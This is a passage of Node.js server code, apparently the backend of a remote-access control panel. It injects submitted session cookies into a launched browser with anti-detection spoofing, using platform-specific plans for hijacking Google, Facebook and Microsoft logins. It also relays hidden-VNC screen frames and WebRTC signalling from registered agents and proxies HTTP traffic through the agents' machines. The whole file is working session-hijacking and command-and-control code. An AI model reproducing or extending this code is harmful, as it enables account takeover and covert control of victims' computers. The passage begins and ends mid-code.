    const offset = offsets[Math.floor(Math.random() * offsets.length)];
    return {
        x: Math.max(0, offset.x),
        y: Math.max(0, offset.y)
    };
}

// ─── ENSURE VIEWPORT (simple and reliable) ──────────────────────────
async function ensureProperViewport(page, targetWidth, targetHeight) {
    try {
        await page.setViewport({
            width: targetWidth,
            height: targetHeight,
            deviceScaleFactor: 1
        });
        // Small delay to let the viewport apply
        await new Promise(resolve => setTimeout(resolve, 200));
        return true;
    } catch (err) {
        console.warn(`[INJECT] Viewport warning: ${err.message}`);
        return false;
    }
}

// ─── MAIN ENDPOINT ──────────────────────────────────────────────────
app.post('/api/cookies/inject-domain', async (req, res) => {
    let browser = null;
    let page = null;
    let userDataDir = null;

    try {
        const { cookies, url, options = {} } = req.body;

        // --- Basic validation ---
        if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
            return res.status(400).json({ success: false, message: 'No cookies provided' });
        }

        console.log(`[INJECT] Starting injection for ${cookies.length} cookies`);

        // --- Locate browser executable ---
        const browserPaths = [
            'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
            'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\Application\\msedge.exe'
        ];

        let executablePath = browserPaths.find(p => p && fs.existsSync(p));
        if (!executablePath) {
            return res.status(400).json({
                success: false,
                message: 'No browser found (Chrome or Edge required).'
            });
        }
        console.log(`[INJECT] Using browser: ${executablePath}`);

        // --- Build injection plan ---
        const plan = buildInjectionPlan(url, cookies);
        console.log(`[INJECT] Strategy: ${plan.strategy}, Phases: ${plan.phases.length}`);

        // --- Screen & viewport sizes ---
        const screenSize = getRandomScreenSize();
        const viewportSize = getViewportSize(screenSize);
        const windowPosition = getWindowPosition();

        const windowWidth = screenSize.width;
        const windowHeight = screenSize.height;
        const viewportWidth = viewportSize.width;
        const viewportHeight = viewportSize.height;

        console.log(`[INJECT] Window: ${windowWidth}x${windowHeight}, Viewport: ${viewportWidth}x${viewportHeight}`);

        // --- Temporary user data directory ---
        userDataDir = path.join(
            process.env.TEMP || require('os').tmpdir(),
            'browser_inject_' + Date.now() + '_' + Math.random().toString(36).substring(7)
        );
        if (!fs.existsSync(userDataDir)) {
            fs.mkdirSync(userDataDir, { recursive: true });
        }

        // --- Launch browser with SAFE arguments (no crash‑prone flags) ---
        const launchArgs = [
            '--no-first-run',
            '--no-default-browser-check',
            '--disable-extensions',
            '--disable-plugins',
            '--disable-translate',
            '--disable-sync',
            '--disable-background-networking',
            '--disable-default-apps',
            '--disable-component-update',
            '--safebrowsing-disable-auto-update',
            '--disable-dev-shm-usage',
            '--ignore-ssl-errors',
            '--allow-running-insecure-content',
            '--disable-crash-reporter',
            '--disable-breakpad',
            '--disable-logging',
            '--disable-notifications',
            '--disable-popup-blocking',
            '--disable-session-crashed-bubble',
            '--disable-features=IsolateOrigins,site-per-process',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            `--window-size=${windowWidth},${windowHeight}`,
            `--window-position=${windowPosition.x},${windowPosition.y}`,
            '--new-window',
            'about:blank'
        ];

        // GPU flags only in production (safe)
        if (process.env.NODE_ENV === 'production') {
            launchArgs.push('--disable-gpu');
            launchArgs.push('--disable-software-rasterizer');
        }

        browser = await puppeteer.launch({
            executablePath,
            userDataDir,
            headless: false,            // Show UI
            args: launchArgs,
            defaultViewport: {
                width: viewportWidth,
                height: viewportHeight,
                deviceScaleFactor: 1
            },
            timeout: 30000,
            ignoreDefaultArgs: ['--enable-automation', '--disable-extensions']
        });

        console.log('[INJECT] Browser launched successfully');

        // --- Create page and apply anti‑detection (safe) ---
        page = await browser.newPage();
        await page.setDefaultTimeout(30000);

        // Anti‑detection script – only safe overrides
        await page.evaluateOnNewDocument(`
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(screen, 'width', { get: () => ${windowWidth} });
            Object.defineProperty(screen, 'height', { get: () => ${windowHeight} });
            Object.defineProperty(window, 'outerWidth', { get: () => ${windowWidth} });
            Object.defineProperty(window, 'outerHeight', { get: () => ${windowHeight} });
            Object.defineProperty(window, 'innerWidth', { get: () => ${viewportWidth} });
            Object.defineProperty(window, 'innerHeight', { get: () => ${viewportHeight} });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
            Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });
            if (!navigator.plugins || navigator.plugins.length === 0) {
                const plugins = [
                    { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                    { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                    { name: 'Native Client', filename: 'internal-nacl-plugin' }
                ];
                plugins.length = 3;
                plugins.item = function(i) { return this[i] || null; };
                plugins.namedItem = function(name) {
                    for (let i = 0; i < this.length; i++) {
                        if (this[i].name === name) return this[i];
                    }
                    return null;
                };
                Object.defineProperty(navigator, 'plugins', { get: () => plugins });
            }
            if (!window.chrome) {
                window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {} };
            }
            console.log('[ANTI-DETECTION] Applied');
        `);

        // User agent
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        ];
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        await page.setUserAgent(userAgent);

        // Headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'sec-ch-ua': `"Google Chrome";v="122", "Not:A-Brand";v="8", "Chromium";v="122"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        });

        // Initial delay
        await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));

        // --- Inject cookies per phase ---
        let totalInjected = 0;
        let failedCookies = [];

        for (const phase of plan.phases) {
            console.log(`[INJECT] Phase: ${phase.name} – ${phase.cookies.length} cookies`);

            // Navigate
            try {
                await page.goto(phase.url, { waitUntil: 'domcontentloaded', timeout: 15000 });
            } catch (err) {
                console.warn(`[INJECT] Navigation to ${phase.url} failed: ${err.message}`);
                // Continue anyway – some sites may still work
            }

            // Re‑apply viewport (some sites change it)
            await ensureProperViewport(page, viewportWidth, viewportHeight);

            // Human‑like scroll
            try {
                await page.evaluate(() => {
                    window.scrollBy(0, Math.floor(Math.random() * 200) + 50);
                });
                await new Promise(resolve => setTimeout(resolve, 200 + Math.random() * 300));
            } catch (_) {}

            // Inject each cookie
            for (const cookie of phase.cookies) {
                try {
                    const cookieData = sanitizeCookie(cookie, plan.baseDomain);
                    await page.setCookie(cookieData);
                    totalInjected++;
                    console.log(`[INJECT] ✅ ${cookie.name}`);
                } catch (err) {
                    failedCookies.push(cookie.name);
                    console.warn(`[INJECT] ❌ ${cookie.name}: ${err.message}`);
                }
            }

            // Delay between phases
            if (phase !== plan.phases[plan.phases.length - 1]) {
                await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 500));
            }
        }

        // --- Final navigation to the target URL ---
        const finalUrl = plan.phases[plan.phases.length - 1]?.url || url || `https://${plan.baseDomain}`;
        console.log(`[INJECT] Final navigation to ${finalUrl}`);
        try {
            await page.goto(finalUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
        } catch (err) {
            console.warn(`[INJECT] Final navigation failed: ${err.message}`);
        }

        // Ensure viewport after final load
        await ensureProperViewport(page, viewportWidth, viewportHeight);

        // Let cookies settle
        await new Promise(resolve => setTimeout(resolve, 2000));

        // --- Send response (browser stays open) ---
        res.json({
            success: true,
            message: `Injected ${totalInjected}/${cookies.length} cookies`,
            injected: totalInjected,
            total: cookies.length,
            strategy: plan.strategy,
            url: finalUrl,
            viewport: { width: viewportWidth, height: viewportHeight },
            screen: { width: windowWidth, height: windowHeight },
            failed: failedCookies.slice(0, 10)
        });

        console.log('[INJECT] ✅ Injection complete. Browser remains open – close it manually when done.');

        // !!! NO AUTO‑CLOSE – the browser stays open for you to inspect !!!

    } catch (error) {
        console.error('[INJECT] Fatal error:', error);
        // Emergency cleanup (only on error)
        try {
            if (page) await page.close();
            if (browser) await browser.close();
            if (userDataDir && fs.existsSync(userDataDir)) {
                fs.rmSync(userDataDir, { recursive: true, force: true });
            }
        } catch (_) {}
        res.status(500).json({
            success: false,
            message: process.env.NODE_ENV === 'production' ? 'Injection failed' : error.message
        });
    }
});

// ─── BUILD INJECTION PLAN (your original, unchanged) ──────────────
function buildInjectionPlan(url, cookies) {
    let domain = 'unknown';
    let baseDomain = 'unknown';

    try {
        if (url) {
            const urlObj = new URL(url);
            domain = urlObj.hostname;
            if (domain.startsWith('www.')) domain = domain.substring(4);
            const parts = domain.split('.');
            baseDomain = parts.length > 2 ? parts.slice(-2).join('.') : domain;
        }
    } catch (e) {
        // Try to extract domain from cookies
        for (const cookie of cookies) {
            if (cookie.domain) {
                domain = cookie.domain;
                if (domain.startsWith('.')) domain = domain.substring(1);
                const parts = domain.split('.');
                baseDomain = parts.length > 2 ? parts.slice(-2).join('.') : domain;
                break;
            }
        }
        if (domain === 'unknown') {
            domain = cookies[0]?.domain || 'unknown';
            baseDomain = domain;
        }
    }

    // Enhanced auth pattern detection
    const authPatterns = [
        /session/i, /auth/i, /token/i, /sid/i, /id/i,
        /login/i, /user/i, /account/i, /identity/i,
        /oauth/i, /openid/i, /sso/i,
        /^__Secure-/, /^__Host-/,
        /PHPSESSID/, /JSESSIONID/, /ASP\.NET_SessionId/,
        /SAPISID/, /APISID/, /HSID/, /SSID/, /NID/,
        /c_user/, /xs/, /datr/, /fr/, /sb/,
        /atoken/, /rtoken/, /access_token/, /refresh_token/,
        /jwt/i, /bearer/i
    ];

    const authCookies = [];
    const regularCookies = [];

    cookies.forEach(cookie => {
        const name = (cookie.name || '').toLowerCase();
        let isAuth = false;
        
        // Check against auth patterns
        for (const pattern of authPatterns) {
            if (pattern.test(name)) {
                isAuth = true;
                break;
            }
        }
        
        // Additional auth detection
        if (cookie.httpOnly || cookie.is_httponly) isAuth = true;
        if (cookie.secure && cookie.value && cookie.value.length > 30) isAuth = true;
        if (name.startsWith('__host-') || name.startsWith('__secure-')) isAuth = true;
        if (cookie.value && cookie.value.length > 50 && /^[A-Za-z0-9\-_]+$/.test(cookie.value)) isAuth = true;

        if (isAuth) {
            authCookies.push(cookie);
        } else {
            regularCookies.push(cookie);
        }
    });

    const plan = {
        domain: domain,
        baseDomain: baseDomain,
        strategy: 'generic',
        phases: []
    };

    // Platform-specific strategies
    if (domain.includes('google.com') || domain.includes('gmail.com')) {
        plan.strategy = 'google';
        const googleAuth = authCookies.filter(c =>
            ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID'].includes(c.name) ||
            c.name.startsWith('__Secure-')
        );
        const googleSupport = authCookies.filter(c =>
            !['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID'].includes(c.name) &&
            !c.name.startsWith('__Secure-')
        );
        plan.phases = [
            {
                name: 'Google Core Auth',
                priority: 1,
                url: 'https://accounts.google.com',
                cookies: googleAuth.map(c => ({
                    ...c,
                    domain: '.google.com',
                    path: '/',
                    secure: true
                }))
            },
            {
                name: 'Google Supporting',
                priority: 2,
                url: 'https://accounts.google.com',
                cookies: googleSupport.map(c => ({
                    ...c,
                    domain: '.google.com',
                    path: '/'
                }))
            },
            {
                name: 'Google Service',
                priority: 3,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    ...c,
                    domain: c.host || c.domain || `.${baseDomain}`
                }))
            }
        ];
    } else if (domain.includes('facebook.com') || domain.includes('meta.com')) {
        plan.strategy = 'facebook';
        const fbAuth = authCookies.filter(c =>
            ['c_user', 'xs', 'datr', 'fr', 'sb'].includes(c.name)
        );
        plan.phases = [
            {
                name: 'Facebook Core Auth',
                priority: 1,
                url: 'https://www.facebook.com',
                cookies: fbAuth.map(c => ({
                    ...c,
                    domain: '.facebook.com',
                    path: '/',
                    secure: true
                }))
            },
            {
                name: 'Facebook Service',
                priority: 2,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    ...c,
                    domain: c.host || c.domain || `.${baseDomain}`
                }))
            }
        ];
    } else if (domain.includes('microsoft.com') || domain.includes('live.com') || domain.includes('outlook.com')) {
        plan.strategy = 'microsoft';
        plan.phases = [
            {
                name: 'Microsoft Auth',
                priority: 1,
                url: 'https://login.live.com',
                cookies: authCookies.map(c => ({
                    ...c,
                    domain: '.live.com',
                    path: '/',
                    secure: true
                }))
            },
            {
                name: 'Microsoft Service',
                priority: 2,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    ...c,
                    domain: c.host || c.domain || `.${baseDomain}`
                }))
            }
        ];
    } else {
        // Enhanced generic strategy
        plan.strategy = 'generic';
        
        // Try to find best authentication URL
        let loginUrl = `https://${domain}`;
        const loginDomains = ['login', 'auth', 'account', 'accounts', 'signin', 'secure', 'authentication'];
        
        // Check if any cookies have auth-related domains
        const authDomainCookies = cookies.filter(c => {
            const host = (c.host || c.domain || '').toLowerCase();
            return loginDomains.some(d => host.includes(d));
        });
        
        if (authDomainCookies.length > 0) {
            const loginHost = authDomainCookies[0].host || authDomainCookies[0].domain;
            if (loginHost && !loginHost.includes('unknown')) {
                loginUrl = `https://${loginHost.startsWith('.') ? loginHost.substring(1) : loginHost}`;
            }
        }
        
        // Also check for common auth patterns in cookie names
        const sessionCookies = cookies.filter(c => 
            /session/i.test(c.name) || 
            /token/i.test(c.name) || 
            /auth/i.test(c.name)
        );
        
        if (sessionCookies.length > 0 && authDomainCookies.length === 0) {
            // Try to use the session cookie's domain as login URL
            const sessionDomain = sessionCookies[0].domain;
            if (sessionDomain && !sessionDomain.includes('unknown')) {
                loginUrl = `https://${sessionDomain.startsWith('.') ? sessionDomain.substring(1) : sessionDomain}`;
            }
        }
        
        plan.phases = [
            {
                name: 'Authentication Cookies',
                priority: 1,
                url: loginUrl,
                cookies: authCookies.map(c => ({
                    ...c,
                    domain: c.host || c.domain || `.${baseDomain}`
                }))
            },
            {
                name: 'Service Cookies',
                priority: 2,
                url: `https://${domain}`,
                cookies: regularCookies.map(c => ({
                    ...c,
                    domain: c.host || c.domain || `.${baseDomain}`
                }))
            }
        ];
    }
    
    // Filter out empty cookie phases
    plan.phases = plan.phases.filter(phase => phase.cookies.length > 0);
    
    // If no cookies left, add a fallback phase
    if (plan.phases.length === 0) {
        plan.phases.push({
            name: 'All Cookies',
            priority: 1,
            url: `https://${domain}`,
            cookies: cookies.map(c => ({
                ...c,
                domain: c.host || c.domain || `.${baseDomain}`
            }))
        });
    }
    
    return plan;
}

// ─── PROXY ROUTE ──────────────────────────────────────────────────
const agentSockets = new Map();

function getAgentSocket(agentId) {
    const socket = agentSockets.get(agentId);
    console.log(`[WebRTC] 🔍 Looking for agent ${agentId}: ${socket ? 'Found' : 'Not found'}`);
    console.log(`[WebRTC] 📋 Available agents:`, Array.from(agentSockets.keys()));
    return socket;
}

io.on('connection', (socket) => {
    console.log('[SOCKET] New connection:', socket.id);

    socket.on('register_agent', (data) => {
    const agentId = data.agentId;
    if (agentId) {
        agentSockets.set(agentId, socket);
        console.log(`[PROXY] Agent ${agentId} registered (socket: ${socket.id})`);
        // ─── Deliver any pending WebRTC answer ──────────────
        for (const [sessionId, session] of webrtcSessions) {
            if (session.agentId === agentId && session.pendingAnswer) {
                socket.emit('webrtc_answer', {
                    sessionId: sessionId,
                    sdp: session.pendingAnswer
                });
                console.log(`[WebRTC] 📤 Delivered pending answer to agent ${agentId}`);
                delete session.pendingAnswer;
            }
            // Also deliver pending ICE candidates
            if (session.agentId === agentId && session.iceCandidates && session.iceCandidates.length > 0) {
                for (const candidate of session.iceCandidates) {
                    socket.emit('webrtc_ice_candidate', {
                        sessionId: sessionId,
                        candidate: candidate.candidate
                    });
                }
                session.iceCandidates = [];
                console.log(`[WebRTC] 📤 Delivered ${session.iceCandidates.length} pending ICE candidates to agent ${agentId}`);
            }
        }
        // ──────────────────────────────────────────────────────
        socket.on('disconnect', () => {
            agentSockets.delete(agentId);
            console.log(`[PROXY] Agent ${agentId} unregistered`);
        });
    }
});

    socket.on('http_response', (data) => {
        const { requestId, status, headers, body } = data;
        const pending = pendingRequests.get(requestId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingRequests.delete(requestId);
            pending.resolve({ status, headers, body });
        }
    });

    socket.on('http_chunk', (data) => {
        const { requestId, chunk } = data;
        const pending = pendingRequests.get(requestId);
        if (pending && pending.onChunk) {
            pending.onChunk(chunk);
        }
    });

    socket.on('http_stream_end', (data) => {
        const { requestId } = data;
        const pending = pendingRequests.get(requestId);
        if (pending && pending.onEnd) {
            pending.onEnd();
        }
        pendingRequests.delete(requestId);
    });

    socket.on('http_stop_stream', (data) => {
        pendingRequests.delete(data.requestId);
    });

    // ─── HVNC Frame Handler ──────────────────────────────────────
    socket.on('hvnc_frame', (data) => {
        const { agentId, sessionId, width, height, data: frameData, timestamp, type, keyframe, seq, fps } = data;
        console.log(`[HVNC] 📥 Frame from ${agentId}, type: ${type || 'jpeg'}, size: ${frameData?.length || 0}, seq: ${seq || 0}`);
        
        if (!agentId) {
            console.warn('[HVNC] Frame without agentId');
            return;
        }
        
        hvncFrames.set(agentId, {
            frame: frameData,
            width: width || 1920,
            height: height || 1080,
            timestamp: timestamp || Date.now(),
            sessionId: sessionId || 'unknown',
            type: type || 'jpeg',
            keyframe: keyframe || false,
            seq: seq || 0,
            fps: fps || 0,
            lastUpdate: Date.now()
        });
        
        const frameCount = (hvncFrames.get(agentId)?.frameCount || 0) + 1;
        hvncFrames.get(agentId).frameCount = frameCount;
        
        if (frameCount % 10 === 0) {
            const stored = hvncFrames.get(agentId);
            console.log(`[HVNC] Frame ${frameCount} from ${agentId}: ${stored.width}x${stored.height} (${stored.type})`);
        }
        
        const viewers = hvncViewers.get(agentId) || new Set();
        let broadcastCount = 0;
        for (const viewerSocket of viewers) {
            if (viewerSocket.connected) {
                try {
                    viewerSocket.emit('hvnc_frame', {
                        agentId,
                        sessionId,
                        width,
                        height,
                        data: frameData,
                        timestamp,
                        type: type || 'jpeg',
                        keyframe: keyframe || false,
                        seq: seq || 0,
                        fps: fps || 0
                    });
                    broadcastCount++;
                } catch (err) {
                    console.error('[HVNC] Broadcast error:', err);
                    viewers.delete(viewerSocket);
                }
            } else {
                viewers.delete(viewerSocket);
            }
        }
        if (broadcastCount > 0 && broadcastCount % 10 === 0) {
            console.log(`[HVNC] Broadcast to ${broadcastCount} viewers for ${agentId}`);
        }
    });

    socket.on('hvnc_viewer', (data) => {
        const { agentId, sessionId } = data;
        if (!agentId) return;
        
        if (!hvncViewers.has(agentId)) {
            hvncViewers.set(agentId, new Set());
        }
        hvncViewers.get(agentId).add(socket);
        socket.hvncAgentId = agentId;
        socket.hvncSessionId = sessionId;
        console.log(`[HVNC] Viewer registered for ${agentId}`);
        
        const latest = hvncFrames.get(agentId);
        if (latest && latest.frame) {
            socket.emit('hvnc_frame', {
                agentId,
                sessionId: latest.sessionId,
                width: latest.width,
                height: latest.height,
                data: latest.frame,
                timestamp: latest.timestamp,
                type: latest.type || 'jpeg',
                keyframe: latest.keyframe || false,
                seq: latest.seq || 0,
                fps: latest.fps || 0
            });
            console.log(`[HVNC] Sent latest frame to viewer for ${agentId} (${latest.type})`);
        } else {
            console.log(`[HVNC] No frame available for ${agentId}`);
        }
    });




    // ─── WEBRTC SOCKET.IO EVENTS ────────────────────────────────────
socket.on('webrtc_offer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[WebRTC-SIO] Offer from agent for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    // Store offer
    session.offer = sdp;
    session.connected = true;
    
    // Forward to all connected viewers
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    console.log(`[WebRTC-SIO] Offer forwarded to ${forwardedCount} viewers`);
});

socket.on('webrtc_answer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[WebRTC-SIO] Answer from viewer for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    // Store answer
    session.answer = sdp;
    
    // Forward to agent via Socket.IO
    const agentSocket = getAgentSocket(session.agentId);
    if (agentSocket && agentSocket.connected) {
        agentSocket.emit('webrtc_answer', {
            sessionId: sessionId,
            sdp: sdp
        });
        console.log(`[WebRTC-SIO] Answer forwarded to agent ${session.agentId}`);
    } else {
        console.log(`[WebRTC-SIO] Agent ${session.agentId} not connected, storing answer`);
        session.pendingAnswer = sdp;
    }
});

socket.on('webrtc_ice_candidate', (data) => {
    const { sessionId, candidate, target } = data;
    console.log(`[WebRTC-SIO] ICE candidate for session ${sessionId} -> ${target}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    if (target === 'viewer') {
        // Forward to all viewers
        for (const viewer of session.viewers) {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'ice_candidate',
                    candidate: candidate,
                    sessionId: sessionId
                }));
            }
        }
    } else if (target === 'agent') {
        // Forward to agent
        const agentSocket = getAgentSocket(session.agentId);
        if (agentSocket && agentSocket.connected) {
            agentSocket.emit('webrtc_ice_candidate', {
                sessionId: sessionId,
                candidate: candidate
            });
        } else {
            session.iceCandidates.push({
                candidate: candidate,
                timestamp: Date.now()
            });
        }
    }
});




// ─── HVNC WebRTC Socket.IO Events ──────────────────────────────

// Agent sends HVNC WebRTC offer via Socket.IO
socket.on('hvnc_webrtc_offer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[HVNC WebRTC-SIO] Offer from agent for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[HVNC WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    session.offer = sdp;
    session.connected = true;
    
    // Forward to viewers
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    console.log(`[HVNC WebRTC-SIO] Offer forwarded to ${forwardedCount} viewers`);
});

// Viewer sends HVNC WebRTC answer
socket.on('hvnc_webrtc_answer', (data) => {
    const { sessionId, sdp } = data;
    console.log(`[HVNC WebRTC-SIO] Answer from viewer for session ${sessionId}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[HVNC WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    session.answer = sdp;
    
    // Forward to agent
    const agentSocket = getAgentSocket(session.agentId);
    if (agentSocket && agentSocket.connected) {
        agentSocket.emit('hvnc_webrtc_answer', {
            sessionId: sessionId,
            sdp: sdp
        });
        console.log(`[HVNC WebRTC-SIO] Answer forwarded to agent ${session.agentId}`);
    } else {
        session.pendingAnswer = sdp;
        console.log(`[HVNC WebRTC-SIO] Agent ${session.agentId} not connected, storing answer`);
    }
});

// ICE candidate exchange for HVNC WebRTC
socket.on('hvnc_webrtc_ice', (data) => {
    const { sessionId, candidate, target } = data;
    console.log(`[HVNC WebRTC-SIO] ICE candidate for session ${sessionId} -> ${target}`);
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        console.log(`[HVNC WebRTC-SIO] Session not found: ${sessionId}`);
        return;
    }
    
    if (target === 'viewer') {
        for (const viewer of session.viewers) {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.send(JSON.stringify({
                    type: 'ice_candidate',
                    candidate: candidate,
                    sessionId: sessionId
                }));
            }
        }
    } else if (target === 'agent') {
        const agentSocket = getAgentSocket(session.agentId);
        if (agentSocket && agentSocket.connected) {
            agentSocket.emit('hvnc_webrtc_ice', {
                sessionId: sessionId,
                candidate: candidate
            });
        } else {
            session.iceCandidates.push({
                candidate: candidate,
                timestamp: Date.now()
            });
        }
    }
});


    socket.on('hvnc_status', (data) => {
        console.log(`[HVNC] Status from ${data.agentId}: ${data.status}`);
    });

    socket.on('hvnc_command_response', (data) => {
        console.log(`[HVNC] Command response:`, data);
    });

    socket.on('disconnect', () => {
        if (socket.hvncAgentId) {
            const viewers = hvncViewers.get(socket.hvncAgentId);
            if (viewers) {
                viewers.delete(socket);
                if (viewers.size === 0) {
                    hvncViewers.delete(socket.hvncAgentId);
                }
            }
            console.log(`[HVNC] Viewer removed for ${socket.hvncAgentId}`);
        }
    });
});

const pendingRequests = new Map();

app.all('/api/hvnc/proxy/*', async (req, res) => {
    const agentId = req.query.agentId;
    if (!agentId) {
        return res.status(400).json({ error: 'Missing agentId' });
    }

    const socket = getAgentSocket(agentId);
    if (!socket) {
        return res.status(404).json({ error: 'Agent not connected' });
    }

    const requestId = `proxy_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const method = req.method;
    const path = req.params[0] || '';
    const headers = req.headers;
    delete headers.host;
    delete headers['content-length'];
    const body = req.body;
    const isStreaming = path === 'mjpeg';

    const message = {
        type: 'http_request',
        requestId,
        method,
        path: `/${path}`,
        headers,
        body: method !== 'GET' ? body : undefined,
        streaming: isStreaming
    };

    if (isStreaming) {
        const streamId = requestId;
        socket.emit('http_request', message);

        res.writeHead(200, {
            'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Connection': 'keep-alive',
            'Access-Control-Allow-Origin': '*',
            'Cross-Origin-Resource-Policy': 'cross-origin'
        });

        const streamPending = {
            onChunk: (chunkBase64) => {
                try {
                    const chunk = Buffer.from(chunkBase64, 'base64');
                    res.write(chunk);
                } catch (err) {
                    console.error('[Proxy] Chunk write error:', err);
                }
            },
            onEnd: () => {
                res.end();
                pendingRequests.delete(requestId);
            }
        };
        pendingRequests.set(requestId, streamPending);

        req.on('close', () => {
            socket.emit('http_stop_stream', { requestId: streamId });
            pendingRequests.delete(requestId);
        });

        let lastChunkTime = Date.now();
        const checkInterval = setInterval(() => {
            if (Date.now() - lastChunkTime > 60000) {
                clearInterval(checkInterval);
                res.end();
                pendingRequests.delete(requestId);
                socket.emit('http_stop_stream', { requestId: streamId });
            }
        }, 5000);

        const originalOnChunk = streamPending.onChunk;
        streamPending.onChunk = (chunkBase64) => {
            lastChunkTime = Date.now();
            originalOnChunk(chunkBase64);
        };

        return;
    }

    try {
        const response = await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                pendingRequests.delete(requestId);
                reject(new Error('Proxy request timed out'));
            }, 30000);

            pendingRequests.set(requestId, { resolve, reject, timer: timeout });
            socket.emit('http_request', message);
        });

        res.status(response.status).set(response.headers).send(response.body);
    } catch (err) {
        console.error('[Proxy] Error:', err.message);
        res.status(504).json({ error: 'Proxy request failed' });
    }
});

// ─── HVNC HTTP ENDPOINTS ────────────────────────────────────────
app.get('/api/hvnc/frame/:agentId', (req, res) => {
    const { agentId } = req.params;
    const frame = hvncFrames.get(agentId);
    if (frame && frame.frame) {
        const imgData = Buffer.from(frame.frame, 'base64');
        res.set('Content-Type', 'image/jpeg');
        res.send(imgData);
    } else {
        res.status(404).send('No frame');
    }
});

// ─── POLLING ENDPOINT ──────────────────────────────────────────

app.get('/api/hvnc/mjpeg/:agentId', (req, res) => {
    const { agentId } = req.params;
    console.log(`[MJPEG-HVNC] Request for agent: ${agentId}`);

    const socket = getAgentSocket(agentId);
    if (!socket) {
        console.log(`[MJPEG-HVNC] Agent ${agentId} not connected`);
        return res.status(404).send('Agent not connected');
    }

    const boundary = 'frame';
    res.writeHead(200, {
        'Content-Type': `multipart/x-mixed-replace; boundary=${boundary}`,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });

    let frameCount = 0;
    let isClosed = false;

    const sendFrame = () => {
        if (isClosed) return;
        const current = hvncFrames.get(agentId);
        if (current && current.frame) {
            try {
                if (current.type === 'h264') {
                    return;
                }
                
                const img = Buffer.from(current.frame, 'base64');
                if (img.length > 2 && img[0] === 0xFF && img[1] === 0xD8) {
                    res.write(`--${boundary}\r\n`);
                    res.write('Content-Type: image/jpeg\r\n');
                    res.write(`Content-Length: ${img.length}\r\n\r\n`);
                    res.write(img);
                    res.write('\r\n');
                    frameCount++;
                    if (frameCount % 10 === 0) {
                        console.log(`[MJPEG-HVNC] Sent ${frameCount} frames for ${agentId}`);
                    }
                } else {
                    console.warn('[MJPEG-HVNC] Invalid JPEG for agent', agentId);
                }
            } catch (err) {
                console.error('[MJPEG-HVNC] Send error:', err);
                clearInterval(interval);
                if (!isClosed) {
                    res.end();
                    isClosed = true;
                }
            }
        }
    };

    const interval = setInterval(sendFrame, 100);
